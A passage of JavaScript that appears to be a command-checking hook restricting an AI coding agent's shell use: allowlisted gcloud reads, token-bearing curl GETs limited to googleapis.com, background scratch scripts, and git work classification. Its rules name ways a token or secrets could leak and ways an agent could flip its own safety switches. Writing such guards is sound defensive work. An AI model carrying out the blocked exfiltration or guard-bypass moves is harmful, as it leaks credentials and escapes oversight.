  // other cd shape or an unresolvable/out-of-repo target.
  let gitCwd = cwd;
  const firstTrimmed = segments.length ? segments[0].trim() : '';
  if (firstTrimmed && /^cd\b/i.test(firstTrimmed)) {
    const rawPath = classifyLeadingCdSegment(firstTrimmed);
    if (!rawPath) return false;
    const resolved = resolvedLeadingCdTarget(rawPath, cwd);
    if (!resolved) return false;
    gitCwd = resolved;
    rest = segments.slice(1);
    if (!rest.length) return false; // a bare `cd <dir>` alone is not a push chain
  }
  let sawPush = false;
  for (const seg of rest) {
    const trimmed = seg.trim();
    if (!trimmed) continue;
    const cls = classifyPlainGitChainSegment(trimmed);
    if (!cls) return false; // any other segment disqualifies the whole chain
    if (cls.kind === 'push') {
      if (!isPlainPushRemoteAllowed(cls.remote, gitCwd)) return false;
      if (!isPlainPushRefAllowed(cls.ref, gitCwd)) return false;
      sawPush = true;
    }
    // (c) trailing read-only segments (log/status/show) are only ever
    // meaningful AFTER a push has already appeared in this chain — before
    // that, `git status`/`git log`/`git show` were never part of the
    // original allowance and must not silently start qualifying.
    if ((cls.kind === 'log' || cls.kind === 'status' || cls.kind === 'show' ||
         cls.kind === 'lsremote' || cls.kind === 'revparse') && !sawPush) return false;
    if (cls.kind === 'lsremote' && !isPlainPushRemoteAllowed(cls.remote, gitCwd)) return false;
  }
  return true;
}

// ---------------------------------------------------------------------------
// Narrow read-only gcloud (owner-approved 2026-09-26). In the MAIN THREAD
// ONLY (checked after the isCoordinator gate in main()), three shapes run
// inline even though `gcloud` is a HEAVY_VERB:
//   A. `gcloud auth print-access-token` — the whole command, nothing else.
//   B. `gcloud <group…> <describe|list|get-iam-policy|read> … --format=
//      json|yaml|value(...)`, optionally piped into a bounded sink or jq.
//   C. `T=$(gcloud auth print-access-token); curl -s|-sS [-H "Authorization:
//      Bearer $T"] <https URL>` (`;` or `&&`), GET only, output piped into a
//      bounded sink / jq or capped with --max-filesize.
// Everything else stays blocked: other gcloud verbs, curl with -X other than
// GET, -d/--data*/-F/-T/--upload-file/-o/-O/--output (every flag outside a
// short allowlist is refused), `@file`, and any extra chained segment.
// Reuses splitSegmentsDetailed/tokenizeQuoted/effectiveVerb/
// isBoundedSinkSegment/hasUnquotedRedirectChar/hasShellExpansionAnywhere —
// no new parser. Gated by guards.allowGcloudReads (default true).
// ---------------------------------------------------------------------------

const GCLOUD_READ_VERBS = new Set(['describe', 'list', 'get-iam-policy', 'read']);
const GCLOUD_FORMAT_RE = /^(?:json|yaml|value\(.+\))$/;
// jq builtins that read the environment, other inputs/files or source
// locations (0.113 P3): `env`/`$ENV` expose every env var, `input(s)` and
// `input_filename` reach beyond the piped JSON, `import`/`include` load
// modules from disk.
const JQ_REFUSED_FILTER_RE = /\$ENV|\$__loc__|(^|[^A-Za-z0-9_$])(?:env|input|inputs|input_filename|import|include)(?![A-Za-z0-9_])/;
const JQ_SAFE_FLAGS = new Set(['-r', '-c', '-e', '-S', '-M', '--raw-output', '--compact-output', '--sort-keys', '--monochrome-output']);

// A pipe-fed tail segment for shapes B and C: a bounded sink (tail/head/wc/
// grep -c/grep -m N) or `jq` with only formatting flags and one filter. No
// redirect or expansion of any kind.
function isGcloudReadSinkSegment(segment) {
  if (hasUnquotedRedirectChar(segment) || hasShellExpansionAnywhere(segment)) return false;
  const tokens = tokenizeQuoted(segment);
  if (!tokens.length) return false;
  if (tokens[0] === 'jq') {
    let filters = 0;
    for (const t of tokens.slice(1)) {
      if (t.startsWith('-')) { if (!JQ_SAFE_FLAGS.has(t)) return false; continue; }
      if (JQ_REFUSED_FILTER_RE.test(t)) return false;
      filters++;
    }
    return filters <= 1;
  }
  if (!['tail', 'head', 'wc', 'grep'].includes(tokens[0])) return false;
  // grep -f/--file reads its patterns from a FILE, and its match output then
  // echoes that file's content — refuse it (and any short cluster with f).
  if (tokens[0] === 'grep' && tokens.some((t) => /^-[A-Za-z]*f/.test(t) || /^--file(?:=|$)/.test(t))) return false;
  return isBoundedSinkSegment(segment);
}

// Shape B (and the literal shape A): one `gcloud` segment.
function isGcloudReadSegment(rawSegment) {
  const segment = stripGcloudStderrMerge(rawSegment); // the one accepted redirection
  if (hasUnquotedRedirectChar(segment) || hasShellExpansionAnywhere(segment)) return false;
  const tokens = tokenizeQuoted(segment);
  if (tokens[0] !== 'gcloud') return false; // no env prefix, no wrapper
  const rest = tokens.slice(1);
  if (rest.length === 2 && rest[0] === 'auth' && rest[1] === 'print-access-token') return 'token';
  const g = gcloudReadGrammar(rest, GCLOUD_READ_VERBS);
  if (!g) return false;
  // `read` is a gcloud verb only under `logging` (`gcloud [beta] logging read`);
  // anywhere else the word is a resource name posing as the verb.
  if (g.verb === 'read' && g.path[g.path.length - 1] !== 'logging') return false;
  const formats = g.flags.filter((f) => f.startsWith('--format='));
  if (formats.length !== 1 || !GCLOUD_FORMAT_RE.test(formats[0].slice(9))) return false;
  return 'read';
}

// Shape C's curl segment. `tokenVar` is the variable the token was assigned
// to; `$T`/`${T}` may appear ONLY as `Authorization: Bearer $T`.
// The token may only ever reach Google: the URL's PARSED host must be
// googleapis.com or a subdomain of it — no userinfo, no IP literal, no other
// host. Redirect-following (-L), --resolve/--connect-to, proxies (-x),
// --url and -K/--config are refused by the flag allowlist below (every flag
// not listed is refused).
const GOOGLEAPIS_HOST_RE = /(^|\.)googleapis\.com$/;
function isGoogleApisHttpsUrl(raw) {
  // The RAW host text must already be plain ASCII and identical to what the
  // URL parser yields — no percent-encoding, IDN/full-width lookalikes or
  // curl URL globbing ({a,b} / [1-2]) that curl could expand differently.
  if (/[{}\[\]]/.test(raw)) return false;
  const rawHost = (raw.match(/^https:\/\/([^/?#:]*)/) || [])[1] || '';
  if (!/^[A-Za-z0-9.-]+$/.test(rawHost)) return false;
  let u;
  try { u = new URL(raw); } catch (_) { return false; }
  if (u.hostname.toLowerCase() !== rawHost.toLowerCase()) return false;
  if (u.protocol !== 'https:') return false;
  if (u.username || u.password || raw.includes('@')) return false;
  const host = u.hostname.toLowerCase();
  if (!host || host.startsWith('[') || /^[\d.]+$/.test(host)) return false; // IP literal
  return GOOGLEAPIS_HOST_RE.test(host);
}

const CURL_SHORT_FLAG_RE = /^-[sSf]+$/;
const CURL_BARE_FLAGS = new Set(['--silent', '--show-error', '--fail']);
function curlSegmentShape(segment, tokenVar) {
  if (hasUnquotedRedirectChar(segment)) return null;
  if (hasSubstitutionOutsideSingleQuotes(segment) || /[`\\]|[<>]\(/.test(segment)) return null;
  const tv = tokenVar.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  const tokenRefRe = new RegExp('\\$(?:\\{' + tv + '\\}|' + tv + '(?![A-Za-z0-9_]))', 'g');
  const tokens = tokenizeQuoted(segment);
  if (tokens[0] !== 'curl') return null;
  let silent = false;
  let url = null;
  let maxFilesize = false;
  for (let i = 1; i < tokens.length; i++) {
    const t = tokens[i];
    if (CURL_SHORT_FLAG_RE.test(t)) { if (t.includes('s')) silent = true; continue; }
    if (CURL_BARE_FLAGS.has(t)) { if (t === '--silent') silent = true; continue; }
    if (t === '-X' || t === '--request') { if (tokens[i + 1] !== 'GET') return null; i++; continue; }
    if (t === '-XGET' || t === '--request=GET') continue;
    if (t === '--max-filesize' || t === '--max-time' || t === '-m') {
      if (!/^\d+$/.test(tokens[i + 1] || '')) return null;
      if (t === '--max-filesize') maxFilesize = true;
      i++; continue;
    }
    if (t === '-H' || t === '--header') {
      const h = tokens[i + 1];
      if (typeof h !== 'string' || !h || h.startsWith('@')) return null;
      const stripped = h.replace(tokenRefRe, '');
      if (/[$`\\]/.test(stripped)) return null;
      if (stripped !== h && !new RegExp('^Authorization:\\s*Bearer\\s+\\$(?:\\{' + tv + '\\}|' + tv + ')$', 'i').test(h)) return null;
      i++; continue;
    }
    if (t.startsWith('-')) return null; // every other flag (-d/-F/-T/-o/-O/-K/--data*…) is refused
    if (url !== null) return null;
    if (!/^https:\/\/[^\s$`\\@]+$/.test(t)) return null;
    if (!isGoogleApisHttpsUrl(t)) return null;
    url = t;
  }
  if (!silent || !url) return null;
  // `$` anywhere outside the allowed header reference is refused.
  if (/\$/.test(segment.replace(tokenRefRe, ''))) return null;
  return { maxFilesize };
}

const GCLOUD_TOKEN_PREFIX_RE = /^\s*([A-Za-z_][A-Za-z0-9_]*)=\$\(\s*gcloud\s+auth\s+print-access-token\s*\)\s*(?:;|&&)\s*/;
// The token variable is one of a closed set of names (0.113 P2): any other
// name could be an env var curl itself reads (HTTPS_PROXY, http_proxy,
// CURL_CA_BUNDLE, SSLKEYLOGFILE, …) and hand the token to a proxy or a file.
const GCLOUD_TOKEN_VAR_ALLOWED_RE = /^(T|TOKEN|ACCESS_TOKEN|GCLOUD_TOKEN)$/;

// isAllowedGcloudReadCommand(command) -> bool. See the header block above.
function isAllowedGcloudReadCommand(command) {
  if (typeof command !== 'string' || !command.trim()) return false;
  if (/#/.test(neutralizeQuotedContents(command))) return false; // a comment can hide a segment
  const prefix = command.match(GCLOUD_TOKEN_PREFIX_RE);
  if (prefix) {
    const tokenVar = prefix[1];
    if (!GCLOUD_TOKEN_VAR_ALLOWED_RE.test(tokenVar)) return false;
    const rest = command.slice(prefix[0].length);
    const { segments, delims } = splitSegmentsDetailed(rest);
    if (!segments.length || delims[delims.length - 1] !== 'end') return false;
    const shape = curlSegmentShape(segments[0], tokenVar);
    if (!shape) return false;
    for (let i = 0; i < delims.length - 1; i++) if (delims[i] !== '|') return false;
    for (let i = 1; i < segments.length; i++) if (!isGcloudReadSinkSegment(segments[i])) return false;
    return segments.length > 1 || shape.maxFilesize; // output piped or bounded
  }
  const { segments, delims } = splitSegmentsDetailed(command);
  if (!segments.length || delims[delims.length - 1] !== 'end') return false;
  const kind = isGcloudReadSegment(segments[0]);
  if (!kind) return false;
  if (kind === 'token') return segments.length === 1;
  for (let i = 0; i < delims.length - 1; i++) if (delims[i] !== '|') return false;
  for (let i = 1; i < segments.length; i++) if (!isGcloudReadSinkSegment(segments[i])) return false;
  return true;
}

// ---------------------------------------------------------------------------
// Background scratch scripts (owner-approved 2026-09-26). In the MAIN THREAD
// ONLY, a Bash call with `tool_input.run_in_background: true` may run ONE
// segment of the shape `<python3|node|sh|bash> <script file> [args…]` when
// the script is an existing regular file inside this session's scratchpad or
// a tmp root (isScratchpadOrTmpPath -> lib/scratchpad.js, realpath'd). The
// output goes to the background task's file, not the main thread. The script
// segment may be chained (`;`/`&&`/`|`) with bounded read sinks only
// (wc/head/tail/grep -c|-m N). Refused:
// any interpreter option before the file (-c/-e/-m/…), a leading env
// assignment or wrapper, chaining to anything but a bounded sink, any
// `$`/backtick/backslash/process substitution, a stdin redirect, and a
// write redirect outside the scratchpad/tmp. A script run DIRECTLY (`<path> [args]`,
// shebang + exec bit) is also accepted when it is a regular executable file
// inside this session's OWN scratchpad (no tmp roots, no symlink component).
// A foreground run keeps today's
// rules. Gated by guards.allowBackgroundScratchScripts (default true).
// ---------------------------------------------------------------------------
const BACKGROUND_SCRIPT_INTERPRETERS = new Set(['python3', 'node', 'sh', 'bash']);
const BACKGROUND_CHAIN_DELIMS = new Set([';', '&&', '|', 'end']);

// One `<python3|node|sh|bash> <script file> [args…]` segment, script inside
// the scratchpad/tmp (realpath'd), no --confirmed, not an anti-hall plugin script.
function isBackgroundScratchScriptSegment(segment, ctx) {
  const tokens = tokenizeQuoted(segment.replace(/\d*>>?\s*\S+/g, ' '));
  // Direct exec (shebang + exec bit): argv[0] is itself the script. Stricter
  // than the interpreter form: OWN scratchpad only (never a generic tmp root),
  // every component lstat'd (no symlinks), regular executable file. A leading
  // `VAR=…` token is not a path, so env-prefix assignments stay refused.
  const direct = tokens.length >= 1 && tokens[0].includes('/') && !BACKGROUND_SCRIPT_INTERPRETERS.has(tokens[0]);
  if (!direct && (tokens.length < 2 || !BACKGROUND_SCRIPT_INTERPRETERS.has(tokens[0]))) return false;
  const script = direct ? tokens[0] : tokens[1];
  if (!script || script.startsWith('-')) return false;
  if (!isScratchpadOrTmpPath(script, direct ? Object.assign({ ownOnly: true }, ctx) : ctx)) return false;
  const payload = ctx.payload;
  if (direct && sinkPathHasSymlink(script, payload)) return false;
  const base = (typeof payload.cwd === 'string' && payload.cwd) || process.cwd();
  let realScript;
  try {
    // Joined WITHOUT lexical normalization, then realpath'd: the kernel resolves
    // `L/../x` through the symlink L, so path.resolve's textual `..` collapse
    // would point at a different file than the one that actually runs.
    const joined = path.isAbsolute(script) ? script : base.replace(/\/+$/, '') + '/' + script;
    realScript = fs.realpathSync.native(joined); // .native: libc realpath keeps `L/..` physical (JS realpathSync pre-normalizes `..`)
    const st = fs.statSync(realScript);
    if (!st.isFile()) return false;
    if (direct && (st.mode & 0o111) === 0) return false;
  } catch (_) { return false; }
  // Mirrors the 0.112 F1 rule of the script-check carve-out: never a way to
  // flip a safety switch or trust an allowlist from the main thread —
  // `--confirmed` anywhere refuses, and so does any script inside an
  // anti-hall plugin root (this install, a cache copy, a dev checkout).
  if (tokens.some((t) => t === '--confirmed' || t.startsWith('--confirmed='))) return false;
  if (isInsideAntiHallPlugin(realScript)) return false;
  return true;
}

// The command is one or more segments joined by `;`/`&&`/`|`, each either a
// scratch-script segment or a bounded read sink (tail/head/wc/grep -c|-m N) —
// the exact remedy shape the block text suggests (`script > out; wc -l out`).
// At least one scratch-script segment is required; anything else refuses.
function isBackgroundScratchScript(command, payload) {
  if (!payload || !payload.tool_input || payload.tool_input.run_in_background !== true) return false;
  if (typeof command !== 'string' || !command.trim()) return false;
  if (/#/.test(neutralizeQuotedContents(command))) return false;
  if (hasShellExpansionAnywhere(command)) return false;
  const neutralized = neutralizeQuotedContents(command);
  if (/</.test(neutralized)) return false;
  const ctx = { payload };
  if (hasDisallowedWriteRedirect(command, ctx)) return false;
  const { segments, delims } = splitSegmentsDetailed(command);
  if (!segments.length) return false;
  let sawScript = false;
  for (let i = 0; i < segments.length; i++) {
    if (!BACKGROUND_CHAIN_DELIMS.has(delims[i])) return false;
    const seg = segments[i].trim();
    if (!seg) return false;
    if (isBackgroundScratchScriptSegment(seg, ctx)) sawScript = true;
    else if (!isBoundedSinkSegment(seg) && !isScratchFileSinkSegment(seg, ctx)) return false;
  }
  return sawScript;
}

// ---------------------------------------------------------------------------
// WORK classifier (coordinator drift) + Bash edit parity (F3).
// classifyBashWork(command, payload, opts) -> { work, blockable, labels, editBlocks }.
// opts.editOnly (F3) skips the script-run and inline-code probes.
// WORK = a state-changing git segment, a gh mutation, or a Bash write into a
// non-notes repo file. Recovery git commands are WORK but never blockable.
// editBlocks = Bash write targets edit-guard's own verdict would block for
// the Edit tool (main() blocks on them; git segments never land here).
// ---------------------------------------------------------------------------

const GIT_ALWAYS_WORK = new Set([
  'commit', 'am', 'revert', 'merge', 'rebase', 'cherry-pick', 'reset', 'push', 'pull', 'restore', 'rm', 'mv',
]);
const GIT_TAG_LIST_RE = /^(?:-l|--list|-n\d*|--contains|--no-contains|--points-at|--merged|--no-merged|-v|--verify)(?:=|$)/;
const GIT_TAG_VALUE_FLAGS = new Set(['-m', '--message', '-F', '--file', '-u', '--local-user', '--cleanup', '--sort', '--format', '--trailer']);

// gitSubAndArgs(segment) -> { sub, args } for a real git invocation, else null.
function gitSubAndArgs(segment) {
  if (effectiveVerb(segment) !== 'git') return null;
  const tokens = tokenizeQuoted(segment);
  const gitIdx = tokens.findIndex((t) => basename(t).toLowerCase() === 'git');
  if (gitIdx === -1) return null;
  const subIdx = gitSubcommandIndex(tokens, gitIdx);
  if (subIdx === -1) return null;
  return { sub: tokens[subIdx].toLowerCase(), args: tokens.slice(subIdx + 1) };
}

function isStateChangingGitSegment(segment) {
  const g = gitSubAndArgs(segment);
  if (!g) return false;
  const { sub, args } = g;
  const has = (re) => args.some((t) => re.test(t));
  if (GIT_ALWAYS_WORK.has(sub)) return true;
  if (sub === 'clean') return !has(/^(?:--dry-run|-[A-Za-z]*n[A-Za-z]*)$/);
  if (sub === 'stash') return !['list', 'show'].includes((args[0] || '').toLowerCase());
  if (sub === 'apply') return has(/^--apply$/) || !has(/^--(?:check|stat|numstat|summary)$/);
  if (sub === 'switch') return has(/^(?:-[cC]|--create|--force-create)(?:=|$)/) || has(/^-[cC]\S/);
  if (sub === 'checkout') return args.includes('--') || has(/^(?:-[bB]|--orphan)(?:=|$)/) || has(/^-[bB]\S/);
  if (sub === 'branch') return has(/^(?:-[A-Za-z]*[Df][A-Za-z]*|--force)$/);
  if (sub === 'tag') {
    if (has(/^(?:-d|--delete)$/)) return true;
    if (has(GIT_TAG_LIST_RE)) return false;
    for (let i = 0; i < args.length; i++) {
      const t = args[i];
      if (GIT_TAG_VALUE_FLAGS.has(t)) { i++; continue; }
      if (!t.startsWith('-')) return true; // a tag name: create
    }
    return false; // bare `git tag` (or flags only) lists
  }
  return false;
}

// Recovery (Decision 4): counted as WORK, never blockable. `git am --skip` is not recovery.
function isRecoveryGitSegment(segment) {
  const g = gitSubAndArgs(segment);
  if (!g) return false;
  const { sub, args } = g;
  if (['am', 'rebase', 'cherry-pick', 'revert'].includes(sub)) return args.includes('--abort') || args.includes('--quit');
  if (sub === 'merge') return args.includes('--abort');
  if (sub === 'stash') return ['pop', 'apply'].includes((args[0] || '').toLowerCase());
  return false;
}

// maskProcessSubstitutions(cmd) -> { text, inners }: `>(…)`/`<(…)` spans are
// blanked so the splitter (which cuts at `(`) keeps `tee >(grep x) out.txt`
// as one segment; the inner commands are returned for recursion, the same way
// `$(…)` substitutions are. Quote- and heredoc-aware.
function maskProcessSubstitutions(cmd) {
  const inners = [];
  let out = '';
  let i = 0;
  let q = '';
  const n = cmd.length;
  while (i < n) {
    const c = cmd[i];
    if (q) {
      if (c === '\\' && q === '"' && i + 1 < n) { out += c + cmd[i + 1]; i += 2; continue; }
      out += c; if (c === q) q = ''; i++; continue;
    }
    if (c === '\\' && i + 1 < n) { out += c + cmd[i + 1]; i += 2; continue; }
    if (c === "'" || c === '"') { q = c; out += c; i++; continue; }
    if (c === '<' && cmd[i + 1] === '<') {
      const h = parseHeredocAt(cmd, i);
      if (h) { out += cmd.slice(i, h.end); i = h.end; continue; }
    }
    if ((c === '<' || c === '>') && cmd[i + 1] === '(') {
      let j = i + 2;
      let depth = 1;
      let qq = '';
      for (; j < n && depth; j++) {
        const d = cmd[j];
        if (qq) { if (d === qq) qq = ''; continue; }
        if (d === "'" || d === '"') qq = d;
        else if (d === '(') depth++;
        else if (d === ')') depth--;
      }
      inners.push(cmd.slice(i + 2, depth ? j : j - 1));
      out += ' ';
      i = j;
      continue;
    }
    out += c; i++;
  }
  return { text: out, inners };
}

// readRedirectTarget(s, i) -> the dequoted shell word starting at i (after
// blanks), or null when it is an fd-dup/process target (`&…`, `(…`) or empty.
function readRedirectTarget(s, i) {
  while (i < s.length && (s[i] === ' ' || s[i] === '\t')) i++;
  if (i >= s.length || s[i] === '&' || s[i] === '(') return null;
  let out = '';
  let q = '';
  for (; i < s.length; i++) {
    const c = s[i];
    if (q) { if (c === q) q = ''; else out += c; continue; }
    if (c === "'" || c === '"') { q = c; continue; }
    if (c === '\\' && i + 1 < s.length) { out += s[i + 1]; i++; continue; }
    if (/\s/.test(c) || /[;|&<>()]/.test(c)) break;
    out += c;
  }
  return out || null;
}

// blankTestOperators(text) -> text with every `<`/`>` inside `[[ … ]]`,
// `(( … ))` and `$(( … ))` replaced by a space (same length). There they are
// string/number comparisons, not redirects. `[[`/`((` open a context only at
// command position (input start, after ; & | ( ! or a newline, or after
// if/while/until/then/do/elif/else); `]]` closes before < > blanks ; & | ) or
// the end. An unclosed `[[`/`((` is dropped at ; or a newline (`[[` also at a
// single & or |), so it never outlives its command. A `$( … )` nested inside
// is a command context again and is left alone. Quotes, `$'…'`, backslash
// escapes and heredoc bodies are copied unchanged.
const TEST_KEYWORDS = new Set(['if', 'while', 'until', 'then', 'do', 'elif', 'else']);
function blankTestOperators(text) {
  if (!/[<>]/.test(text) || !/\(\(|\[\[/.test(text)) return text;
  const n = text.length;
  // 'A' $(( )), 'a' (( )), 'b' [[ ]], 'g' group inside a test, 'p' command
  const stack = [];
  const top = () => stack[stack.length - 1];
  const testCtx = () => { const t = top(); return t === 'A' || t === 'a' || t === 'b' || t === 'g'; };
  const cmdPos = (i) => {
    let j = i - 1;
    while (j >= 0 && (text[j] === ' ' || text[j] === '\t')) j--;
    if (j < 0 || /[;&|(!\n]/.test(text[j])) return true;
    let k = j;
    while (k >= 0 && /[A-Za-z]/.test(text[k])) k--;
    if (!TEST_KEYWORDS.has(text.slice(k + 1, j + 1))) return false;
    while (k >= 0 && (text[k] === ' ' || text[k] === '\t')) k--;
    return k < 0 || /[;&|(!\n]/.test(text[k]);
  };
  const drop = (kinds) => { while (stack.length && kinds.includes(top())) stack.pop(); };
  let out = '';
  let i = 0;
  let q = '';
  while (i < n) {
    const c = text[i];
    const c2 = text[i + 1];
    if (q) {
      if (c === '\\' && q === '"' && i + 1 < n) { out += c + c2; i += 2; continue; }
      out += c; if (c === q) q = ''; i++; continue;
    }
    if (c === '\\' && i + 1 < n) { out += c + c2; i += 2; continue; }
    if (c === '$' && c2 === "'") {
      let j = i + 2;
      while (j < n && text[j] !== "'") j += text[j] === '\\' ? 2 : 1;
      j = Math.min(j + 1, n);
      out += text.slice(i, j); i = j; continue;
    }
    if (c === "'" || c === '"') { q = c; out += c; i++; continue; }
    if (c === '<' && c2 === '<' && !testCtx()) {
      const h = parseHeredocAt(text, i);
      if (h) { out += text.slice(i, h.end); i = h.end; continue; }
    }
    if (c === ';' || c === '\n') drop(['a', 'b', 'g']);
    else if ((c === '&' || c === '|') && c2 !== c && text[i - 1] !== c) drop(['b', 'g']);
    if (c === '$' && c2 === '(' && text[i + 2] === '(') { stack.push('A'); out += '$(('; i += 3; continue; }
    if (c === '$' && c2 === '(') { stack.push('p'); out += '$('; i += 2; continue; }
    if (c === '(' && c2 === '(' && !testCtx() && cmdPos(i)) { stack.push('a'); out += '(('; i += 2; continue; }
    if (c === '(') { stack.push(testCtx() ? 'g' : 'p'); out += c; i++; continue; }
    if (c === ')') {
      if ((top() === 'a' || top() === 'A') && c2 === ')') { stack.pop(); out += '))'; i += 2; continue; }
      if (stack.length) stack.pop();
      out += c; i++; continue;
    }
    if (c === '[' && c2 === '[' && !testCtx() && cmdPos(i) && /\s/.test(text[i + 2] || '')) { stack.push('b'); out += '[['; i += 2; continue; }
    if (c === ']' && c2 === ']' && top() === 'b' && /[\s;&|)<>]|^$/.test(text[i + 2] || '')) { stack.pop(); out += ']]'; i += 2; continue; }
    out += (c === '<' || c === '>') && testCtx() ? ' ' : c;
    i++;
  }
  return out;
}

const REDIRECT_TOKEN_RE = /^\d*(?:&?>>?|>\||<)/;
const BARE_REDIRECT_TOKEN_RE = /^\d*(?:&?>>?|>\||<+)$/;

// bashWriteTargets(segment, cwd?) -> raw (dequoted) paths ONE segment writes:
// `>`/`>>`/`&>`/`>|` redirects, tee args, sed -i / perl -i files, and cp/mv
// destinations (mv also its sources). cwd (default process.cwd()) only
// resolves whether a cp/mv destination is an existing directory.
function bashWriteTargets(segment, cwd) {
  const out = [];
  if (typeof segment !== 'string' || !segment.trim()) return out;
  const keep = (t) => {
    if (!t || t.startsWith('&') || t.startsWith('(') || t.includes('>') || /^\/dev\//.test(t)) return;
    out.push(t);
  };
  // (a) redirects: operators found on the quote-neutralized text (test /
  // arithmetic comparisons blanked), targets read from the original. A `\>`
  // (odd run of backslashes before it) is a literal `>`, not a redirect.
  const neutral = blankTestOperators(neutralizeQuotedContents(segment));
  const re = /(^|[^<>&])(>\||&?>>?)/g;
  let m;
  while ((m = re.exec(neutral))) {
    const op = m.index + m[1].length;
    let bs = 0;
    while (op - 1 - bs >= 0 && neutral[op - 1 - bs] === '\\') bs++;
    if (bs % 2) continue;
    keep(readRedirectTarget(segment, op + m[2].length));
  }

  // (b) argv without redirect tokens (and the word after a bare operator).
  const raw = tokenizeQuoted(segment);
  const toks = [];
  for (let i = 0; i < raw.length; i++) {
    if (raw[i] !== '' && REDIRECT_TOKEN_RE.test(raw[i])) { if (BARE_REDIRECT_TOKEN_RE.test(raw[i])) i++; continue; }
    toks.push(raw[i]);
  }
  const verb = effectiveVerb(segment);
  const vi = toks.findIndex((t) => basename(t).toLowerCase() === verb);
  if (!verb || vi === -1) return out;
  const rest = toks.slice(vi + 1);

  if (verb === 'tee') { // (c)
    for (const t of rest) if (!t.startsWith('-')) keep(t);
  } else if (verb === 'sed') { // (d)
    let inPlace = false;
    let scriptOpt = false;
    const pos = [];
    for (let i = 0; i < rest.length; i++) {
      const t = rest[i];
      if (t === '--') { pos.push(...rest.slice(i + 1)); break; }
      if (t === '-i') { inPlace = true; if (rest[i + 1] === '') i++; continue; } // '' = macOS suffix
      if (t === '-e' || t === '-f' || t === '--expression' || t === '--file') { scriptOpt = true; i++; continue; }
      if (/^--(?:expression|file)=/.test(t)) { scriptOpt = true; continue; }
      if (/^--in-place(?:=|$)/.test(t)) { inPlace = true; continue; }
      if (t.startsWith('--')) continue;
      if (/^-[A-Za-z]/.test(t)) {
        for (let k = 1; k < t.length; k++) {
          const ch = t[k];
          if (ch === 'i') { inPlace = true; break; } // rest of the cluster is the suffix
          if (ch === 'e' || ch === 'f') { scriptOpt = true; if (k === t.length - 1) i++; break; }
        }
        continue;
      }
      pos.push(t);
    }
    if (inPlace) for (const t of (scriptOpt ? pos : pos.slice(1))) keep(t);
  } else if (verb === 'perl') { // (e)
    let inPlace = false;
    let hasE = false;
    const pos = [];
    for (let i = 0; i < rest.length; i++) {
      const t = rest[i];
      if (t === '--') { pos.push(...rest.slice(i + 1)); break; }
      if (/^-[^-]/.test(t)) {
        for (let k = 1; k < t.length; k++) {
          const ch = t[k];
          if (ch === 'i') { inPlace = true; break; }
          if (ch === 'e' || ch === 'E') { hasE = true; if (k === t.length - 1) i++; break; }
        }
        continue;
      }
      if (t.startsWith('--')) continue;
      pos.push(t);
    }
    if (inPlace) for (const t of (hasE ? pos : pos.slice(1))) keep(t);
  } else if (verb === 'cp' || verb === 'mv') { // (f)
    let tdir = null;
    const pos = [];
    for (let i = 0; i < rest.length; i++) {
      const t = rest[i];
      if (t === '--') { pos.push(...rest.slice(i + 1)); break; }
      if (t === '-t' || t === '--target-directory') { tdir = rest[i + 1] || null; i++; continue; }
      if (/^--target-directory=/.test(t)) { tdir = t.slice(t.indexOf('=') + 1); continue; }
      if (/^-t./.test(t)) { tdir = t.slice(2); continue; }
      if (t === '-S' || t === '--suffix') { i++; continue; }
      if (t.startsWith('-')) continue;
      pos.push(t);
    }
    let dest = tdir;
    let srcs = pos;
    if (dest === null) {
      if (pos.length < 2) return out;
      dest = pos[pos.length - 1];
      srcs = pos.slice(0, -1);
    }
    let isDir = tdir !== null || dest.endsWith('/');
    if (!isDir) {
      try { isDir = fs.statSync(path.resolve(cwd || process.cwd(), dest)).isDirectory(); } catch (_) { isDir = false; }
    }
    if (isDir) for (const s of srcs) keep(path.posix.join(dest, basename(s)));
    else keep(dest);
    if (verb === 'mv') for (const s of srcs) keep(s);
  }
  return out;
}

// cdAwareContexts(segments, delims, payload) -> per segment, the list of
// { cwd, cwdUnknown } it may run in. A literal `cd` before `&&` moves the cwd;
// before `;`/`||`/newline both cwds stay possible; a non-literal `cd` makes
// the cwd unknown.
function cdAwareContexts(segments, delims, payload) {
  const sp = require('./lib/scratchpad.js');
  const start = sp.realpathOrSelf(path.resolve((payload && typeof payload.cwd === 'string' && payload.cwd) || process.cwd()));
  let cur = [{ cwd: start, cwdUnknown: false }];
  const out = [];
  for (let i = 0; i < segments.length; i++) {
    out.push(cur);
    const d = delims[i];
    if (d !== '&&' && d !== ';' && d !== '||' && d !== '\n') continue;
    const toks = tokenizeQuoted(segments[i]);
    if (toks[0] !== 'cd') continue;
    const rawArg = segments[i].trim().slice(2).trim();
    const arg = toks[1];
    let next;
    if (toks.length !== 2 || !arg || arg === '-' || /[$`*?[\]{}~]/.test(rawArg)) {
      next = cur.map((c) => ({ cwd: c.cwd, cwdUnknown: true }));
    } else {
      next = cur.map((c) => ({
        cwd: sp.realpathOrSelf(path.resolve(c.cwd, arg)),
        cwdUnknown: c.cwdUnknown && !path.isAbsolute(arg),
      }));
    }
    const merged = d === '&&' ? next : cur.concat(next);
    const seen = new Set();
    cur = merged.filter((c) => {
      const k = c.cwd + '\0' + c.cwdUnknown;
      if (seen.has(k)) return false;
      seen.add(k);
      return true;
    }).slice(0, 8);
  }
  return out;
}

// ---------------------------------------------------------------------------
// Script-file runs and inline interpreter code (coordinator drift, Phase 4).
// A script run is WORK unless an ordered exemption applies: an anti-hall CLI
// (ANTI_HALL_CLI_PATTERNS), an anti-hall plugin root, a binary/non-file direct
// exec, a freshness-proof managed location, a tracked-and-clean (or
// non-coordinator-writable, old) repo script, or an old script in a personal
// tool dir. Inline `-c`/`-e` code is WORK when it runs state-changing git/gh
// or writes a literal non-notes repo file (precise, blockable); looser matches
// are count-only. Nothing here is executed.
// ---------------------------------------------------------------------------

const ANTI_HALL_CLI_PATTERNS = Object.freeze([
  anchoredAntiHallStableLauncher('devswarm.js'),
  anchoredAntiHallStableLauncher('wake-watch.js'),
  anchoredAntiHallCli('scripts', 'devswarm', '(?=\\s|$)'),
]);

const SCRIPT_SHELLS = new Set(['sh', 'bash', 'zsh', 'dash']);
const SCRIPT_INTERPRETERS = new Set(['sh', 'bash', 'zsh', 'dash', 'node', 'python', 'python3', 'ruby', 'perl']);
// Flags that mean "not a script-file run" (inline code, module, syntax check, stdin), per family.
const SCRIPT_NOT_A_RUN_FLAG = {
  shell: /^-[A-Za-z]*[cns]/,
  python: /^-[A-Za-z]*[cm]/,
  node: /^(?:-[A-Za-z]*[epc]|--(?:eval|print|check|interactive)(?:=|$))/,
